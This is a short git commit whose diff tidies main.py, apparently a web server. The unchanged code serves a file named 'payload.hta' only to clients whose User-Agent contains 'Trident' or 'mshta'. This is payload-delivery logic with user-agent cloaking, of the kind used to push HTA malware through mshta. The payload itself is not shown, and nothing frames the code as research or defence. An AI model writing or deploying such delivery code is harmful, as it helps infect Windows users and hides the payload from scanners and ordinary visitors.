9ed2233bfb0d215b199c25cb06dc39d9aed2e66e
xd <thegoatedvalemommy@outlook.com>
2026-07-07 07:09:59 +0200

    Update main.py

--- main.py
+++ main.py
@@ -7,9 +7,7 @@ PORT = int(os.environ.get("PORT", 8000))
 @app.route('/')
 def handle_request():
     user_agent = request.headers.get('User-Agent', '')
-    
     if "Trident" in user_agent or "mshta" in user_agent.lower():
-        # Open and read the separate HTA file directly
         with open("payload.hta", "r") as f:
             return f.read()
     else:
